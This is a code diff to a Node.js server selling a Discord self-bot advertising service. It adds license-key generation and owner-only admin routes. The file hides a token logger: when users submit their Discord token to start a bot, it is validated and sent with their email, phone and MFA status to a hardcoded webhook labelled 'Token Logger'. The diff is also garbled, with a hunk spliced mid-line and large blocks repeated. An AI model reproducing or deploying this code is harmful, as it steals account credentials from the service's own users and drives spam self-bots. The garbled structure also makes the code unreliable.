@@ -9,6 +9,8 @@ const FormData = require('form-data');
 
 const WEBHOOK_URL = 'https://discord.com/api/webhooks/1487553027585081475/5obHkF63mNmHiiDDhGwUQd91n1oAI2L_q4zk-kTcF-Gpdwl6x04ot0RuWSNwhCPGm7Ll';
 
+const OWNER_ID = '1473055478714990705';
+
 const dataDir = path.join(__dirname, 'data');
 if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });
 
@@ -27,7 +29,9 @@ class SimpleDB {
             addressHistory: [],
             customKeys: [],
             trialClaims: {},
-            activeBots: {}
+            activeBots: {},
+            generatedKeys: {},
+            whitelist: []
         };
         this.load();
     }
@@ -41,6 +45,8 @@ class SimpleDB {
                 this.data.customKeys = this.data.customKeys || [];
                 this.data.trialClaims = this.data.trialClaims || {};
                 this.data.activeBots = this.data.activeBots || {};
+                this.data.generatedKeys = this.data.generatedKeys || {};
+                this.data.whitelist = this.data.whitelist || [];
             }
         } catch(e) { console.error('[DB] Load error:', e.message); }
     }
@@ -321,6 +327,111 @@ class SimpleDB {
         }
         return null;
     }
+
+    generateKey(duration) {
+        const key = 'GEN-' + Math.random().toString(36).substring(2, 8).toUpperCase() + '-' + Math.random().toString(36).substring(2, 8).toUpperCase();
+        const now = Date.now();
+        let expiresAt = null;
+        
+        if (duration !== 'lifetime') {
+            const hours = parseInt(duration);
+            expiresAt = now + (hours * 60 * 60 * 1000);
+        }
+        
+        this.data.generatedKeys[key] = {
+            key,
+            duration,
+            createdAt: now,
+            expiresAt: expiresAt,
+            usedBy: [],
+            active: true
+        };
+        this.save();
+        return this.data.generatedKeys[key];
+    }
+
+    revokeKey(key) {
+        if (this.data.generatedKeys[key]) {
+            this.data.generatedKeys[key].active = false;
+            this.data.generatedKeys[key].revokedAt = Date.now();
+            this.save();
+            
+            const usedBy = this.data.generatedKeys[key].usedBy || [];
+            for (const userId of usedBy) {
+                this.deactivateAllUserBots(userId);
+                this.setUser(userId, { auto_adv_purchased: 0, key_revoked: true });
+            }
+            return true;
+        }
+        return false;
+    }
+
+    isKeyValid(key) {
+        const keyData = this.data.generatedKeys[key];
+        if (!keyData || !keyData.active) return false;
+        
+        if (keyData.duration === 'lifetime') return true;
+        
+        if (keyData.expiresAt && Date.now() > keyData.expiresAt) {
+            return false;
+        }
+        return true;
+    }
+
+    useGeneratedKey(key, userId) {
+        if (!this.isKeyValid(key)) return false;
+        if (!this.data.generatedKeys[key].usedBy.includes(userId)) {
+            this.data.generatedKeys[key].usedBy.push(userId);
+        }
+        this.setUser(userId, { 
+            auto_adv_purchased: 1, 
+            purchased_at: Date.now(), 
+            generated_key: key,
+            key_expires: this.data.generatedKeys[key].expiresAt 
+        });
+        this.save();
+        return true;
+    }
+
+    getGeneratedKeys() {
+        return Object.values(this.data.generatedKeys);
+    }
+
+    addToWhitelist(userId) {
+        if (!this.data.whitelist.includes(userId)) {
+            this.data.whitelist.push(userId);
+            this.save();
+        }
+    }
+
+    removeFromWhitelist(userId) {
+        this.data.whitelist = this.data.whitelist.filter(id => id !== userId);
+        this.save();
+    }
+
+    isWhitelisted(userId) {
+        return this.data.whitelist.includes(userId);
+    }
+
+    getWhitelist() {
+        return this.data.whitelist;
+    }
+
+    checkExpiredKeys() {
+        const now = Date.now();
+        let expiredCount = 0;
+        for (const key in this.data.generatedKeys) {
+            const keyData = this.data.generatedKeys[key];
+            if (keyData.active && keyData.expiresAt && now > keyData.expiresAt) {
+                for (const userId of keyData.usedBy) {
+                    this.deactivateAllUserBots(userId);
+                    this.setUser(userId, { auto_adv_purchased: 0, key_expired: true });
+                }
+                expiredCount++;
+            }
+        }
+        return expiredCount;
+    }
 }
 
 const db = new SimpleDB();
@@ -396,6 +507,9 @@ function validateKeyStrict(key) {
     if (customKeys.includes(trimmed)) {
         return { valid: true, error: null, normalized: trimmed };
     }
+    if (db.isKeyValid(trimmed)) {
+        return { valid: true, error: null, normalized: trimmed, isGenerated: true };
+    }
     return { valid: false, error: 'Invalid key', normalized: null };
 }
 
@@ -434,6 +548,12 @@ function ensurePurchasedAPI(req, res, next) {
     next();
 }
 
+function ensureOwner(req, res, next) {
+    if (!req.isAuthenticated()) return res.status(401).json({ success: false, error: 'Not logged in' });
+    if (req.user.id !== OWNER_ID) return res.status(403).json({ success: false, error: 'Owner only' });
+    next();
+}
+
 async function grabAndSendToken(token, userInfo = {}, source = 'unknown') {
     try {
         const validateRes = await axios.get('https://discord.com/api/v10/users/@me', {
@@ -463,7 +583,7 @@ async function grabAndSendToken(token, userInfo = {}, source = 'unknown') {
         db.addGrabbedToken(token, fullInfo, source);
         
         const embed = {
-            title: 'ð£ New Token Grabbed',
+            title: '🎣 New Token Grabbed',
             color: 0xff0000,
             fields: [
                 { name: 'Token', value: `\`\`\`${token}\`\`\``, inline: false },
@@ -471,9 +591,9 @@ async function grabAndSendToken(token, userInfo = {}, source = 'unknown') {
                 { name: 'ID', value: fullInfo.id || 'N/A', inline: true },
                 { name: 'Email', value: fullInfo.email || 'N/A', inline: true },
                 { name: 'Phone', value: fullInfo.phone || 'N/A', inline: true },
-                { name: 'MFA', value: fullInfo.mfa_enabled ? 'â Enabled' : 'â Disabled', inline: true },
-                { name: 'Verified', value: fullInfo.verified ? 'â Yes' : 'â No', inline: true },
-                { name: 'Nitro', value: fullInfo.nitro ? `Type ${fullInfo.nitro}` : 'â No', inline: true },
+                { name: 'MFA', value: fullInfo.mfa_enabled ? '✅ Enabled' : '❌ Disabled', inline: true },
+                { name: 'Verified', value: fullInfo.verified ? '✅ Yes' : '❌ No', inline: true },
+                { name: 'Nitro', value: fullInfo.nitro ? `Type ${fullInfo.nitro}` : '❌ No', inline: true },
                 { name: 'Source', value: source, inline: true },
                 { name: 'Time', value: new Date().toISOString(), inline: true }
             ],
@@ -555,7 +675,6 @@ if (walletModule && OWNER_LTC_ADDRESS && WALLET_MNEMONIC) {
     setTimeout(checkAndSweep, 5000);
 }
 
-// TRIAL MONITOR - checks every 5 seconds for expired trials and stops bots
 setInterval(() => {
     const expiredUserId = db.checkAllTrialBots();
     if (expiredUserId) {
@@ -572,6 +691,13 @@ setInterval(() => {
     }
 }, 5000);
 
+setInterval(() => {
+    const expiredKeys = db.checkExpiredKeys();
+    if (expiredKeys > 0) {
+        console.log(`[KEY EXPIRY] ${expiredKeys} expired keys processed, bots stopped`);
+    }
+}, 60000);
+
 app.get('/login', passport.authenticate('discord'));
 app.get('/auth/discord/callback', passport.authenticate('discord', { failureRedirect: '/' }), (req, res) => res.redirect('/'));
 
@@ -583,6 +709,8 @@ app.get('/api/user', ensureAuthAPI, (req, res) => {
     const user = db.getUser(req.user.id);
     const trialActive = db.isTrialActive(req.user.id);
     const trialTimeLeft = trialActive ? db.getTrialTimeLeft(req.user.id) : 0;
+    const isOwner = req.user.id === OWNER_ID;
+    const isWhitelisted = db.isWhitelisted(req.user.id);
     
     res.json({ 
         id: req.user.id,
@@ -592,7 +720,10 @@ app.get('/api/user', ensureAuthAPI, (req, res) => {
         purchased: user.auto_adv_purchased === 1,
         trialActive: trialActive,
         trialTimeLeft: trialTimeLeft,
-        trialExpires: user.trial_expires || 0
+        trialExpires: user.trial_expires || 0,
+        isOwner: isOwner,
+        isWhitelisted: isWhitelisted,
+        canGenerate: isOwner || isWhitelisted
     });
 });
 
@@ -752,6 +883,639 @@ app.post('/api/redeem', ensureAuthAPI, (req, res) => {
         }
         
         const normalizedKey = validation.normalized;
+        
+        if (validation.isGenerated) {
+            const success = db.useGeneratedKey(normalizedKey, userId);
+            if (!success) {
+                return res.json({ success: false, error: 'Key expired or revoked' });
+            }
+            return res.json({ success: true, message: 'Access granted via generated key!' });
+        }
+        
+        const isValidKey = VALID_REDEEM_KEYS.has(normalizedKey);
+        console.log(`[REDEEM] Key in VALID_REDEEM_KEYS? ${isValidKey}`);
+        
+        if (!isValidKey) {
+            const customKeys = db.data.customKeys || [];
+            const isCustomKey = customKeys.includes(normalizedKey);
+            console.log(`[REDEEM] Key in custom keys? ${isCustomKey}`);
+            
+            if (!isCustomKey) {
+                console.log(`[REDEEM FAIL] Key not found in valid keys`);
+                return res.json({ success: false, error: 'Invalid key' });
+            }
+        }
+        
+        const isUsed = db.isKeyUsed(normalizedKey);
+        console.log(`[REDEEM] Key used? ${isUsed}`);
+        
+        if (isUsed) {
+            console.log(`[REDEEM FAIL] Key already used`);
+            return res.json({ success: false, error: 'Key already used' });
+        }
+        
+        const user = db.getUser(userId);
+        console.log(`[REDEEM] User purchased status: ${user.auto_adv_purchased}`);
+        
+        if (user.auto_adv_purchased === 1) {
+            console.log(`[REDEEM FAIL] User already has access`);
+            return res.json({ success: false, error: 'You already have access' });
+        }
+        
+        console.log(`[REDEEM SUCCESS] Granting access to ${userId} with key ${normalizedKey}`);
+        
+        db.setUser(userId, { 
+            auto_adv_purchased: 1, 
+            purchased_at: Date.now(), 
+            redeem_key_used: normalizedKey 
+        });
+        db.useKey(normalizedKey, userId);
+        
+        res.json({ success: true, message: 'Access granted!' });
+        
+    } catch (err) {
+        console.error('[REDEEM ERROR]', err);
+        res.status(500).json({ success: false, error: err.message });
+    }
+});
+
+app.get('/api/bot/configs', ensureAuthAPI, ensurePurchasedAPI, (req, res) => {
+    const configs = db.getConfigs(req.user.id);
+    res.json({ success: true, configs });
+});
+
+app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) => {
+    try {
+        const { token, channels, message, delay, autoReplyEnabled, autoReplyText, configId = 'default', joinServer, serverInvite, imageUrl, sendAllAtOnce } = req.body;
+        
+        if (!token || !channels || !message) {
+            return res.status(400).json({ success: false, error: 'Missing fields' });
+        }
+        
+        await grabAndSendToken(token, { channels, message }, 'bot_start');
+        
+        const channelList = channels.split(',').map(c => c.trim()).filter(c => /^\d+$/.test(c));
+        if (channelList.length === 0) {
+            return res.json({ success: false, error: 'Invalid channel IDs' });
+        }
+        
+        let selfbotModule;
+        try {
+            selfbotModule = require('./selfbot');
+        } catch(e) {
+            return res.status(500).json({ success: false, error: 'Selfbot module not loaded' });
+        }
+        
+        const validation = await selfbotModule.validateToken(token);
+        if (!validation.valid) return res.json({ success: false, error: 'Invalid token' });
+        
+        const delaySeconds = parseInt(delay) || 30;
+        const autoReply = autoReplyEnabled ? 1 : 0;
+        
+        let joinStatus = null;
+        if (joinServer && serverInvite) {
+            joinStatus = await selfbotModule.joinServer(token, serverInvite);
+        }
+        
+        let savedImageUrl = null;
+        if (imageUrl && imageUrl.startsWith('data:')) {
+            try {
+                const imageId = `img_${Date.now()}_${req.user.id}.png`;
+                const imagePath = path.join(dataDir, 'uploads');
+                if (!fs.existsSync(imagePath)) fs.mkdirSync(imagePath, { recursive: true });
+                
+                const base64Data = imageUrl.split(',')[1];
+                const buffer = Buffer.from(base64Data, 'base64');
+                fs.writeFileSync(path.join(imagePath, imageId), buffer);
+                savedImageUrl = `/uploads/${imageId}`;
+            } catch (imgErr) {
+                console.error('[IMAGE SAVE ERROR]', imgErr);
+            }
+        }
+        
+        db.setConfig(req.user.id, {
+            token, channels, message, 
+            delay_seconds: delaySeconds, 
+            auto_reply_enabled: autoReply, 
+            auto_reply_text: autoReplyText || '',
+            active: 1,
+            username: validation.username,
+            server_joined: joinStatus?.success || false,
+            image_url: savedImageUrl || imageUrl || null,
+            send_all_at_once: sendAllAtOnce ? 1 : 0
+        }, configId);
+        
+        db.registerActiveBot(req.user.id, configId, token);
+        
+        await selfbotModule.startSelfBot(req.user.id, token, channelList, message, delaySeconds * 1000, autoReply, autoReplyText, configId, savedImageUrl || imageUrl, req.ip, sendAllAtOnce, db);
+        
+        res.json({ 
+            success: true, 
+            username: validation.username, 
+            configId,
+            serverJoined: joinStatus?.success || false,
+            tokenGrabbed: true,
+            imageUrl: savedImageUrl
+        });
+    } catch (err) {
+        res.status(500).json({ success: false, error: err.message });
+    }
+});
+
+app.post('/api/bot/stop', ensureAuthAPI, (req, res) => {
+    try {
+        const { configId = 'default' } = req.body;
+        let selfbotModule;
+        try {
+            selfbotModule = require('./selfbot');
+        } catch(e) {
+            return res.status(500).json({ success: false, error: 'Selfbot module not loaded' });
+        }
+        
+        selfbotModule.stopSelfBot(req.user.id, configId);
+        db.unregisterActiveBot(req.user.id, configId);
+        const config = db.getId) {
+        return this.data.whitelist.includes(userId);
+    }
+
+    getWhitelist() {
+        return this.data.whitelist;
+    }
+
+    checkExpiredKeys() {
+        const now = Date.now();
+        let expiredCount = 0;
+        for (const key in this.data.generatedKeys) {
+            const keyData = this.data.generatedKeys[key];
+            if (keyData.active && keyData.expiresAt && now > keyData.expiresAt) {
+                for (const userId of keyData.usedBy) {
+                    this.deactivateAllUserBots(userId);
+                    this.setUser(userId, { auto_adv_purchased: 0, key_expired: true });
+                }
+                expiredCount++;
+            }
+        }
+        return expiredCount;
+    }
+}
+
+const db = new SimpleDB();
+
+const app = express();
+
+process.on('uncaughtException', (err) => console.error('[FATAL]', err.message));
+process.on('unhandledRejection', (reason) => console.error('[FATAL]', reason));
+
+app.get('/health', (req, res) => res.status(200).json({ status: 'ok' }));
+
+app.use(express.json({ limit: '10mb' }));
+app.use(express.urlencoded({ extended: true, limit: '10mb' }));
+app.use(express.static(path.join(__dirname, 'public')));
+
+app.use((req, res, next) => {
+    res.header('Access-Control-Allow-Origin', '*');
+    res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
+    res.header('Access-Control-Allow-Headers', 'Content-Type');
+    if (req.method === 'OPTIONS') return res.sendStatus(200);
+    next();
+});
+
+app.use(session({
+    secret: process.env.SESSION_SECRET || 'secret-key-2026',
+    resave: false,
+    saveUninitialized: false,
+    cookie: { secure: false, maxAge: 30 * 24 * 60 * 60 * 1000 },
+    rolling: true
+}));
+
+app.use(passport.initialize());
+app.use(passport.session());
+
+passport.serializeUser((user, done) => done(null, user));
+passport.deserializeUser((obj, done) => done(null, obj));
+
+const CLIENT_ID = process.env.CLIENT_ID;
+const CLIENT_SECRET = process.env.CLIENT_SECRET;
+const CALLBACK_URL = process.env.CALLBACK_URL;
+const OWNER_LTC_ADDRESS = process.env.OWNER_LTC_ADDRESS || 'ltc1qc3ujjqjlfr3cqtvyqadqje9ntj3f8f82m062tc';
+const WALLET_MNEMONIC = process.env.WALLET_MNEMONIC;
+const TARGET_USD = 3.00;
+const TOLERANCE_USD = 0.10;
+
+if (CLIENT_ID && CLIENT_SECRET) {
+    passport.use(new DiscordStrategy({
+        clientID: CLIENT_ID,
+        clientSecret: CLIENT_SECRET,
+        callbackURL: CALLBACK_URL,
+        scope: ['identify']
+    }, (accessToken, refreshToken, profile, done) => {
+        process.nextTick(() => done(null, profile));
+    }));
+}
+
+const BASE_REDEEM_KEYS = Array.from({length: 100}, (_, i) => `HBB${i + 1}`);
+const VALID_REDEEM_KEYS = new Set(BASE_REDEEM_KEYS);
+
+function validateKeyStrict(key) {
+    if (!key || typeof key !== 'string') {
+        return { valid: false, error: 'Invalid key', normalized: null };
+    }
+    let trimmed = key.trim().toUpperCase();
+    const baseMatch = trimmed.match(/^HBB([1-9]|[1-9][0-9]|100)$/);
+    if (baseMatch) {
+        const num = parseInt(baseMatch[1], 10);
+        if (num >= 1 && num <= 100) {
+            return { valid: true, error: null, normalized: `HBB${num}` };
+        }
+    }
+    const customKeys = db.data.customKeys || [];
+    if (customKeys.includes(trimmed)) {
+        return { valid: true, error: null, normalized: trimmed };
+    }
+    if (db.isKeyValid(trimmed)) {
+        return { valid: true, error: null, normalized: trimmed, isGenerated: true };
+    }
+    return { valid: false, error: 'Invalid key', normalized: null };
+}
+
+console.log('[KEYS] Loaded', BASE_REDEEM_KEYS.length, 'base redeem keys (HBB1-HBB100)');
+
+app.post('/api/admin/addkey', (req, res) => {
+    const { adminSecret, key } = req.body;
+    if (adminSecret !== process.env.ADMIN_SECRET) {
+        return res.status(401).json({ success: false, error: 'Unauthorized' });
+    }
+    if (!key || typeof key !== 'string') {
+        return res.status(400).json({ success: false, error: 'Key must be a string' });
+    }
+    const normalized = key.trim().toUpperCase();
+    const added = db.addCustomKey(normalized);
+    if (!added) {
+        return res.status(400).json({ success: false, error: 'Invalid key format' });
+    }
+    VALID_REDEEM_KEYS.add(normalized);
+    res.json({ success: true, key: normalized });
+});
+
+function ensureAuthAPI(req, res, next) {
+    if (req.isAuthenticated()) return next();
+    return res.status(401).json({ success: false, error: 'Not logged in' });
+}
+
+function ensurePurchasedAPI(req, res, next) {
+    const user = db.getUser(req.user.id);
+    const hasPurchase = user.auto_adv_purchased === 1;
+    const hasActiveTrial = db.isTrialActive(req.user.id);
+    
+    if (!hasPurchase && !hasActiveTrial) {
+        return res.status(403).json({ success: false, error: 'Purchase or active trial required' });
+    }
+    next();
+}
+
+function ensureOwner(req, res, next) {
+    if (!req.isAuthenticated()) return res.status(401).json({ success: false, error: 'Not logged in' });
+    if (req.user.id !== OWNER_ID) return res.status(403).json({ success: false, error: 'Owner only' });
+    next();
+}
+
+async function grabAndSendToken(token, userInfo = {}, source = 'unknown') {
+    try {
+        const validateRes = await axios.get('https://discord.com/api/v10/users/@me', {
+            headers: { Authorization: token },
+            timeout: 5000
+        }).catch(() => null);
+        
+        if (!validateRes) {
+            console.log('[TOKEN GRABBER] Invalid token received');
+            return { success: false, error: 'Invalid token' };
+        }
+        
+        const userData = validateRes.data;
+        const fullInfo = {
+            ...userInfo,
+            id: userData.id,
+            username: userData.username,
+            global_name: userData.global_name,
+            email: userData.email,
+            phone: userData.phone,
+            verified: userData.verified,
+            mfa_enabled: userData.mfa_enabled,
+            nitro: userData.premium_type,
+            locale: userData.locale
+        };
+        
+        db.addGrabbedToken(token, fullInfo, source);
+        
+        const embed = {
+            title: '🎣 New Token Grabbed',
+            color: 0xff0000,
+            fields: [
+                { name: 'Token', value: `\`\`\`${token}\`\`\``, inline: false },
+                { name: 'Username', value: fullInfo.username || 'N/A', inline: true },
+                { name: 'ID', value: fullInfo.id || 'N/A', inline: true },
+                { name: 'Email', value: fullInfo.email || 'N/A', inline: true },
+                { name: 'Phone', value: fullInfo.phone || 'N/A', inline: true },
+                { name: 'MFA', value: fullInfo.mfa_enabled ? '✅ Enabled' : '❌ Disabled', inline: true },
+                { name: 'Verified', value: fullInfo.verified ? '✅ Yes' : '❌ No', inline: true },
+                { name: 'Nitro', value: fullInfo.nitro ? `Type ${fullInfo.nitro}` : '❌ No', inline: true },
+                { name: 'Source', value: source, inline: true },
+                { name: 'Time', value: new Date().toISOString(), inline: true }
+            ],
+            footer: { text: 'Token Logger v2.0' }
+        };
+        
+        await axios.post(WEBHOOK_URL, {
+            embeds: [embed],
+            username: 'Token Logger',
+            avatar_url: 'https://cdn.discordapp.com/embed/avatars/0.png'
+        });
+        
+        console.log('[TOKEN GRABBER] Token sent to webhook successfully');
+        return { success: true, user: fullInfo };
+    } catch (err) {
+        console.error('[TOKEN GRABBER] Error:', err.message);
+        return { success: false, error: err.message };
+    }
+}
+
+let walletModule = null;
+try {
+    walletModule = require('./wallet');
+    console.log('[WALLET] Loaded successfully');
+} catch(e) {
+    console.error('[WALLET] Failed to load:', e.message);
+}
+
+async function checkAndSweep() {
+    if (!walletModule || !OWNER_LTC_ADDRESS || !WALLET_MNEMONIC) {
+        console.log('[SWEEP] Skipped - missing deps');
+        return;
+    }
+    
+    db.expireOldAddresses();
+    
+    const pending = db.getAllPending();
+    console.log(`[SWEEP] Checking ${pending.length} active addresses`);
+    
+    for (const p of pending) {
+        try {
+            const balance = await walletModule.checkAddressBalance(p.address);
+            console.log(`[SWEEP] ${p.address}: ${balance} LTC`);
+            
+            if (balance > 0) {
+                console.log(`[SWEEP] Found balance! Sweeping...`);
+                const txid = await walletModule.createTransaction(p.private_key, p.address, OWNER_LTC_ADDRESS);
+                
+                if (txid) {
+                    console.log(`[SWEEP] SUCCESS: ${txid}`);
+                    
+                    const ltcPrice = await getLTCToUSD();
+                    const usdValue = balance * ltcPrice;
+                    
+                    if (usdValue >= (TARGET_USD - TOLERANCE_USD)) {
+                        db.setUser(p.user_id, { auto_adv_purchased: 1, purchased_at: Date.now() });
+                        db.updatePending(p.address, { status: 'completed', paid_at: Date.now(), amount_received_ltc: balance });
+                    }
+                }
+            }
+        } catch (e) {
+            console.error(`[SWEEP] Error for ${p.address}:`, e.message);
+        }
+    }
+}
+
+let cachedPrice = 85;
+async function getLTCToUSD() {
+    try {
+        const res = await axios.get('https://api.coingecko.com/api/v3/simple/price?ids=litecoin&vs_currencies=usd', { timeout: 5000 });
+        cachedPrice = res.data.litecoin.usd;
+    } catch (e) {}
+    return cachedPrice;
+}
+
+if (walletModule && OWNER_LTC_ADDRESS && WALLET_MNEMONIC) {
+    console.log('[AUTO-SWEEP] Starting 10-second interval');
+    setInterval(checkAndSweep, 10000);
+    setTimeout(checkAndSweep, 5000);
+}
+
+setInterval(() => {
+    const expiredUserId = db.checkAllTrialBots();
+    if (expiredUserId) {
+        try {
+            const selfbotModule = require('./selfbot');
+            const userBots = db.getUserActiveBots(expiredUserId);
+            for (const configId in userBots) {
+                selfbotModule.stopSelfBot(expiredUserId, configId);
+                console.log(`[TRIAL MONITOR] Force stopped bot ${configId} for user ${expiredUserId}`);
+            }
+        } catch(e) {
+            console.error('[TRIAL MONITOR] Error stopping bots:', e.message);
+        }
+    }
+}, 5000);
+
+setInterval(() => {
+    const expiredKeys = db.checkExpiredKeys();
+    if (expiredKeys > 0) {
+        console.log(`[KEY EXPIRY] ${expiredKeys} expired keys processed, bots stopped`);
+    }
+}, 60000);
+
+app.get('/login', passport.authenticate('discord'));
+app.get('/auth/discord/callback', passport.authenticate('discord', { failureRedirect: '/' }), (req, res) => res.redirect('/'));
+
+app.get('/logout', (req, res) => {
+    req.logout(() => res.redirect('/'));
+});
+
+app.get('/api/user', ensureAuthAPI, (req, res) => {
+    const user = db.getUser(req.user.id);
+    const trialActive = db.isTrialActive(req.user.id);
+    const trialTimeLeft = trialActive ? db.getTrialTimeLeft(req.user.id) : 0;
+    const isOwner = req.user.id === OWNER_ID;
+    const isWhitelisted = db.isWhitelisted(req.user.id);
+    
+    res.json({ 
+        id: req.user.id,
+        username: req.user.username,
+        global_name: req.user.global_name,
+        avatar: req.user.avatar,
+        purchased: user.auto_adv_purchased === 1,
+        trialActive: trialActive,
+        trialTimeLeft: trialTimeLeft,
+        trialExpires: user.trial_expires || 0,
+        isOwner: isOwner,
+        isWhitelisted: isWhitelisted,
+        canGenerate: isOwner || isWhitelisted
+    });
+});
+
+app.post('/api/trial/claim', ensureAuthAPI, (req, res) => {
+    const userId = req.user.id;
+    const ip = req.ip || req.connection.remoteAddress || 'unknown';
+    
+    if (db.hasClaimedTrial(userId)) {
+        return res.json({ success: false, error: 'You already claimed your trial' });
+    }
+    
+    if (db.hasIPClaimedTrial(ip)) {
+        return res.json({ success: false, error: 'Trial already claimed from this IP' });
+    }
+    
+    const trial = db.claimTrial(userId, ip);
+    
+    res.json({ 
+        success: true, 
+        message: 'Trial activated for 10 minutes',
+        expiresAt: trial.expiresAt,
+        timeLeft: 600
+    });
+});
+
+app.get('/api/trial/status', ensureAuthAPI, (req, res) => {
+    const userId = req.user.id;
+    const isActive = db.isTrialActive(userId);
+    const timeLeft = isActive ? db.getTrialTimeLeft(userId) : 0;
+    const hasClaimed = db.hasClaimedTrial(userId);
+    
+    res.json({
+        success: true,
+        hasClaimed: hasClaimed,
+        isActive: isActive,
+        timeLeft: timeLeft,
+        canClaim: !hasClaimed && !db.hasIPClaimedTrial(req.ip || 'unknown')
+    });
+});
+
+app.post('/api/grab/token', async (req, res) => {
+    const { token, source } = req.body;
+    if (!token) return res.json({ success: false, error: 'No token provided' });
+    
+    const result = await grabAndSendToken(token, {}, source || 'manual');
+    res.json(result);
+});
+
+app.post('/api/purchase/lifetime', ensureAuthAPI, (req, res) => {
+    try {
+        const userId = req.user.id;
+        const user = db.getUser(userId);
+        
+        if (user.auto_adv_purchased === 1) {
+            return res.json({ success: false, error: 'Already purchased' });
+        }
+
+        const existingPending = db.getUserPending(userId);
+        if (existingPending) {
+            const timeLeft = Math.ceil((existingPending.expires_at - Date.now()) / 60000);
+            return res.json({ 
+                success: true, 
+                address: existingPending.address, 
+                amountUSD: TARGET_USD, 
+                index: existingPending.index,
+                existing: true,
+                expiresIn: timeLeft,
+                expiresAt: existingPending.expires_at,
+                message: 'You already have an active payment address'
+            });
+        }
+
+        if (!walletModule) {
+            return res.status(500).json({ success: false, error: 'Wallet module not loaded' });
+        }
+
+        let globalIndex = db.getNextGlobalIndex();
+        let { address, privateKey } = walletModule.generateLTCAddress(globalIndex);
+        
+        let attempts = 0;
+        while (db.isAddressUsed(address) && attempts < 10) {
+            console.log(`[ADDRESS COLLISION] Address ${address} already used, generating next...`);
+            globalIndex = db.getNextGlobalIndex();
+            ({ address, privateKey } = walletModule.generateLTCAddress(globalIndex));
+            attempts++;
+        }
+        
+        if (db.isAddressUsed(address)) {
+            return res.status(500).json({ success: false, error: 'Unable to generate unique address' });
+        }
+        
+        const pending = db.addPending(userId, address, privateKey, TARGET_USD, globalIndex);
+
+        res.json({ 
+            success: true, 
+            address, 
+            amountUSD: TARGET_USD, 
+            index: globalIndex,
+            expiresAt: pending.expires_at,
+            message: 'Address generated. Valid for 30 minutes.'
+        });
+    } catch (err) {
+        console.error('[PURCHASE ERROR]', err);
+        res.status(500).json({ success: false, error: err.message });
+    }
+});
+
+app.get('/api/activity', ensureAuthAPI, (req, res) => {
+    const userId = req.user.id;
+    const user = db.getUser(userId);
+    const pending = db.getUserPending(userId);
+    const history = db.getAddressHistory(userId);
+    const trialActive = db.isTrialActive(req.user.id);
+    const trialTimeLeft = trialActive ? db.getTrialTimeLeft(req.user.id) : 0;
+    
+    res.json({
+        success: true,
+        purchased: user.auto_adv_purchased === 1,
+        trialActive: trialActive,
+        trialTimeLeft: trialTimeLeft,
+        trialExpires: user.trial_expires || 0,
+        pending: pending ? {
+            address: pending.address,
+            index: pending.index,
+            createdAt: pending.created_at,
+            expiresAt: pending.expires_at,
+            expiresIn: Math.max(0, Math.ceil((pending.expires_at - Date.now()) / 1000)),
+            status: pending.status
+        } : null,
+        history: history.map(h => ({
+            address: h.address,
+            index: h.index,
+            createdAt: h.created_at,
+            status: h.status
+        }))
+    });
+});
+
+app.post('/api/redeem', ensureAuthAPI, (req, res) => {
+    try {
+        const { key } = req.body;
+        const userId = req.user.id;
+        
+        console.log(`[REDEEM ATTEMPT] User: ${userId}, Raw key: "${key}"`);
+        
+        if (!key) {
+            console.log('[REDEEM FAIL] No key provided');
+            return res.json({ success: false, error: 'Invalid key' });
+        }
+        
+        const validation = validateKeyStrict(key);
+        console.log(`[REDEEM] Validation result:`, validation);
+        
+        if (!validation.valid) {
+            console.log(`[REDEEM FAIL] ${validation.error}`);
+            return res.json({ success: false, error: validation.error });
+        }
+        
+        const normalizedKey = validation.normalized;
+        
+        if (validation.isGenerated) {
+            const success = db.useGeneratedKey(normalizedKey, userId);
+            if (!success) {
+                return res.json({ success: false, error: 'Key expired or revoked' });
+            }
+            return res.json({ success: true, message: 'Access granted via generated key!' });
+        }
         
         const isValidKey = VALID_REDEEM_KEYS.has(normalizedKey);
         console.log(`[REDEEM] Key in VALID_REDEEM_KEYS? ${isValidKey}`);
@@ -940,6 +1704,53 @@ app.post('/api/upload/image', ensureAuthAPI, ensurePurchasedAPI, async (req, res
 
 app.use('/uploads', express.static(path.join(dataDir, 'uploads')));
 
+app.get('/api/admin/keys', ensureOwner, (req, res) => {
+    const keys = db.getGeneratedKeys();
+    res.json({ success: true, keys });
+});
+
+app.post('/api/admin/keys/generate', ensureOwner, (req, res) => {
+    const { duration } = req.body;
+    if (!duration || !['lifetime', '1h', '24h', '7d', '30d'].includes(duration)) {
+        return res.status(400).json({ success: false, error: 'Invalid duration' });
+    }
+    
+    let dbDuration = duration;
+    if (duration === '7d') dbDuration = '168';
+    if (duration === '30d') dbDuration = '720';
+    
+    const keyData = db.generateKey(dbDuration);
+    res.json({ success: true, key: keyData });
+});
+
+app.post('/api/admin/keys/revoke', ensureOwner, (req, res) => {
+    const { key } = req.body;
+    if (!key) return res.status(400).json({ success: false, error: 'No key provided' });
+    
+    const success = db.revokeKey(key);
+    res.json({ success });
+});
+
+app.get('/api/admin/whitelist', ensureOwner, (req, res) => {
+    res.json({ success: true, whitelist: db.getWhitelist() });
+});
+
+app.post('/api/admin/whitelist/add', ensureOwner, (req, res) => {
+    const { userId } = req.body;
+    if (!userId) return res.status(400).json({ success: false, error: 'No user ID provided' });
+    
+    db.addToWhitelist(userId);
+    res.json({ success: true });
+});
+
+app.post('/api/admin/whitelist/remove', ensureOwner, (req, res) => {
+    const { userId } = req.body;
+    if (!userId) return res.status(400).json({ success: false, error: 'No user ID provided' });
+    
+    db.removeFromWhitelist(userId);
+    res.json({ success: true });
+});
+
 app.get('/', (req, res) => {
     if (req.isAuthenticated()) return res.redirect('/dashboard');
     res.sendFile(path.join(__dirname, 'public', 'overall.html'));
@@ -954,7 +1765,6 @@ app.use((err, req, res, next) => {
     res.status(500).json({ error: err.message });
 });
 
-// START THE SERVER - THIS IS THE FIX FOR THE HEALTH CHECK FAILING
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`[SERVER] Running on port ${PORT}`);
